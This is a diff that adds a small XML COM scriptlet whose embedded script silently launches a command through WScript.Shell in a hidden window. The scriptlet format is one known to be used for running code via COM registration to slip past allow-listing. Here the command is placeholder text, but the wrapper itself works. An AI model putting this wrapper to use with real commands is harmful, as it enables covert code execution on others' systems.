@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+    <scriptlet><registration progid="codeby" classid="{dfa2ce8e-ade3-4809-8d79-f7c9b9a59907}">
+    <script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("ighuigigig",0);]]>
+    </script></registration></scriptlet>
